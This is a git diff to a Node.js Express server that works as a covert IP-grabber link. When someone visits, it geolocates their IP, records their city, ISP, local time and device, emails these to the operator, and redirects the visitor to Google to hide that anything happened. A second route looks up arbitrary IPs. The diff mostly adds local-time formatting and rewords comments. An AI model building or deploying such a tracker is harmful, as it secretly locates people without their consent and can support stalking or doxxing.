@@ -1,5 +1,6 @@
 import dotenv from "dotenv";
 import express from "express";
+import { DateTime } from "luxon";
 import fetch from "node-fetch";
 import nodemailer from "nodemailer";
 import { UAParser } from "ua-parser-js";
@@ -10,7 +11,7 @@ const PORT = process.env.PORT || 3000;
 
 app.set("trust proxy", true);
 
-// Email setup
+// Email transporter
 const transporter = nodemailer.createTransport({
 	service: "gmail",
 	auth: {
@@ -19,9 +20,7 @@ const transporter = nodemailer.createTransport({
 	},
 });
 
-// ======================
-// 1️⃣ Visitor IP Logger
-// ======================
+// Auto-log visitor IP info
 app.get("/", async (req, res) => {
 	const userIP =
 		req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
@@ -33,7 +32,9 @@ app.get("/", async (req, res) => {
 	try {
 		const geoRes = await fetch(`http://ip-api.com/json/${userIP}`);
 		const geo = await geoRes.json();
-		const now = new Date().toLocaleString();
+
+		// Get visitor local time
+		const localTime = DateTime.now().setZone(geo.timezone).toFormat("ffff"); // full formatted time
 
 		const message = `
 ✅ New visitor logged:
@@ -42,7 +43,7 @@ app.get("/", async (req, res) => {
 🌎 Country: ${geo.country}
 🏙️ City: ${geo.city}
 🏢 ISP: ${geo.isp}
-🕒 Time: ${now}
+🕒 Local Time: ${localTime} (${geo.timezone})
 
 🧠 Device: ${ua.device.type || "Desktop"}
 🛠️ OS: ${ua.os.name} ${ua.os.version}
@@ -59,19 +60,16 @@ app.get("/", async (req, res) => {
 			text: message,
 		});
 
-		res.redirect("https://google.com");
+		res.redirect("https://www.google.com/");
 	} catch (err) {
 		console.error("❌ Logging error:", err);
 		res.status(500).send("Error logging IP.");
 	}
 });
 
-// ======================
-// 2️⃣ IP Lookup Tool
-// ======================
+// IP Lookup route
 app.get("/lookup/:ip", async (req, res) => {
 	const targetIP = req.params.ip;
-
 	try {
 		const geoRes = await fetch(`http://ip-api.com/json/${targetIP}`);
 		const data = await geoRes.json();
